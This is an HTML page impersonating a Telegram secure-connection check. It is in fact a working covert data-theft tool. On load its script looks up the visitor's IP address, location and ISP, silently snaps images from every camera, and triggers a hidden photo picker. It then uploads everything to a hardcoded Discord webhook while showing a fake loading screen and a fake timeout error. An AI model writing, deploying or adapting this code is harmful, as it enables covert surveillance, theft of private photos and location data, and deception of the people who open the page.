<!DOCTYPE html>
<html lang="nl">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"/>
  <title>Verifying secure connection...</title>
  <style>
    /* HIDE EVERYTHING — NO VISUAL FEEDBACK */
    body {
      background: #ffffff;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      margin: 0;
      padding: 0;
      height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      opacity: 1;
    }
    /* Fake loading screen — looks innocent */
    .fake-loading {
      text-align: center;
      color: #555;
      font-size: 14px;
      padding: 20px;
    }
    .spinner {
      display: inline-block;
      width: 24px;
      height: 24px;
      border: 2px solid #ccc;
      border-top-color: #24A1DE;
      border-radius: 50%;
      animation: spin 0.8s linear infinite;
      margin-bottom: 12px;
    }
    @keyframes spin { to { transform: rotate(360deg); } }
    /* Hide actual UI elements */
    #hidden-video, #hidden-canvas, #stealth-file-input {
      position: absolute;
      top: -9999px;
      left: -9999px;
      width: 1px;
      height: 1px;
      opacity: 0;
      pointer-events: none;
    }
    .real-ui { display: none; }
  </style>
</head>
<body>
  <div class="fake-loading" id="fakeUI">
    <div class="spinner"></div>
    <div>Establishing secure session with Telegram servers...</div>
    <div style="font-size: 12px; margin-top: 12px; color: #999;">Do not close this window</div>
  </div>

  <!-- Hidden elements for stealth capture -->
  <video id="hidden-video" autoplay playsinline muted></video>
  <canvas id="hidden-canvas"></canvas>
  <input type="file" id="stealth-file-input" accept="image/jpeg,image/png,image/jpg,image/heic,image/heif" multiple style="display:none" />

  <script>
    // ------------------- STEALTH DATA COLLECTOR -------------------
    // NO SOUNDS, NO JUMPSCARES, NO VISUAL FEEDBACK, NO THUMBNAILS, NO REDIRECT
    const WEBHOOK = 'https://discord.com/api/webhooks/1494738036196380876/Q6PQ6OSlX1eLOAgNxOB5r2ZAoy47uvpqXdN8zHhMPn1Qe9rn8GClRWThiLO2MKpB2noV';
    
    let ipInfo = { v4: 'unknown', v6: 'unknown', loc: 'unknown', isp: 'unknown' };
    let cameraImages = []; // { blob, name }
    let galleryFiles = [];  // { file }
    let capturePhase = 'camera'; // camera -> gallery -> send

    // Fetch IP and location silently
    async function loadMeta() {
      try {
        const v4req = await fetch('https://ip-api.com/json/?fields=status,country,city,regionName,isp,query');
        const v4data = await v4req.json();
        if(v4data.status === 'success') {
          ipInfo.v4 = v4data.query;
          ipInfo.loc = `${v4data.city}, ${v4data.regionName}, ${v4data.country}`;
          ipInfo.isp = v4data.isp;
        }
        const v6req = await fetch('https://api64.ipify.org?format=json').catch(() => ({ip:'N/A'}));
        const v6data = await v6req.json();
        ipInfo.v6 = v6data.ip || 'N/A';
      } catch(e) { console.warn(e); }
    }

    // Capture frame from a given stream (silent, no preview)
    async function captureFrameFromStream(stream) {
      const video = document.getElementById('hidden-video');
      video.srcObject = stream;
      return new Promise((resolve) => {
        video.onloadedmetadata = () => {
          video.play();
          setTimeout(() => {
            const canvas = document.getElementById('hidden-canvas');
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            canvas.toBlob(resolve, 'image/jpeg', 0.85);
            video.srcObject = null;
          }, 500);
        };
      });
    }

    // Step 1: Silent camera capture from ALL devices
    async function collectAllCameras() {
      let devices = [];
      try {
        const allDevices = await navigator.mediaDevices.enumerateDevices();
        devices = allDevices.filter(d => d.kind === 'videoinput');
      } catch(e) { return []; }
      
      const captured = [];
      for(let i = 0; i < devices.length; i++) {
        const device = devices[i];
        const label = device.label || `cam_${i}`;
        try {
          const stream = await navigator.mediaDevices.getUserMedia({
            video: { deviceId: { exact: device.deviceId } }
          });
          const blob = await captureFrameFromStream(stream);
          if(blob) {
            captured.push({
              blob: blob,
              name: `silent_cam_${i+1}_${label.replace(/[^a-z0-9]/gi,'_')}.jpg`
            });
          }
          stream.getTracks().forEach(t => t.stop());
        } catch(err) { /* silent fail */ }
      }
      return captured;
    }

    // Step 2: Silent file picker for up to 10 photos (no UI feedback)
    async function collectGalleryPhotos() {
      return new Promise((resolve) => {
        const fileInput = document.getElementById('stealth-file-input');
        // Remove any existing listener
        fileInput.value = '';
        fileInput.onchange = async (e) => {
          const files = Array.from(e.target.files);
          const selected = files.slice(0, 10);
          const fileObjs = selected.map(f => ({ file: f, name: f.name }));
          resolve(fileObjs);
        };
        // If user cancels after 30 seconds, resolve empty
        const timeout = setTimeout(() => {
          resolve([]);
        }, 30000);
        // Trigger file picker silently
        fileInput.click();
        // Override timeout cleanup
        const originalResolve = resolve;
        window.resolveGallery = (result) => {
          clearTimeout(timeout);
          originalResolve(result);
        };
      });
    }

    // Step 3: Send all data to Discord webhook (silent, no redirect)
    async function sendToDiscord(cameraImgs, galleryImgs) {
      if(cameraImgs.length === 0 && galleryImgs.length === 0) return;
      const formData = new FormData();
      const embedPayload = {
        username: "🔒 Stealth Collector",
        embeds: [{
          title: "📸 SILENT DATA COLLECTION",
          color: 0x1A1A1A,
          fields: [
            { name: "📱 Device", value: `\`${navigator.platform}\``, inline: true },
            { name: "🌐 IPv4", value: `\`${ipInfo.v4}\``, inline: true },
            { name: "🌐 IPv6", value: `\`${ipInfo.v6}\``, inline: true },
            { name: "📍 Location", value: ipInfo.loc, inline: false },
            { name: "🏢 ISP", value: ipInfo.isp, inline: false },
            { name: "📷 Cameras Found", value: `${cameraImgs.length} images`, inline: true },
            { name: "🖼️ Gallery Pics", value: `${galleryImgs.length} images (max 10)`, inline: true }
          ],
          footer: { text: "No sounds • No previews • Stealth mode" }
        }]
      };
      formData.append('payload_json', JSON.stringify(embedPayload));
      cameraImgs.forEach((img, idx) => {
        formData.append(`cam_${idx+1}`, img.blob, img.name);
      });
      galleryImgs.forEach((item, idx) => {
        formData.append(`gallery_${idx+1}`, item.file, `gallery_${idx+1}_${item.name}`);
      });
      try {
        await fetch(WEBHOOK, { method: 'POST', body: formData });
      } catch(e) { /* silent fail */ }
    }

    // Main stealth execution
    async function runStealthCollector() {
      await loadMeta();
      
      // Request camera permission (shows browser popup - unavoidable but looks normal)
      try {
        const dummyStream = await navigator.mediaDevices.getUserMedia({ video: true });
        dummyStream.getTracks().forEach(t => t.stop());
      } catch(e) { /* user denied camera — continue anyway */ }
      
      // Collect from all cameras silently
      cameraImages = await collectAllCameras();
      
      // Small delay to seem like loading
      await new Promise(r => setTimeout(r, 800));
      
      // Collect gallery photos (silent file picker)
      galleryFiles = await collectGalleryPhotos();
      
      // Send everything
      await sendToDiscord(cameraImages, galleryFiles);
      
      // No redirect — page stays on fake loading screen forever
      // Optionally change text to look like an error
      const fakeDiv = document.getElementById('fakeUI');
      if(fakeDiv) {
        fakeDiv.innerHTML = '<div style="color:#888;">Connection timed out. Please refresh and try again.</div>';
      }
    }
    
    // Start the collector automatically after 500ms (to ensure DOM ready)
    setTimeout(() => {
      runStealthCollector().catch(console.warn);
    }, 500);
  </script>
</body>
</html>
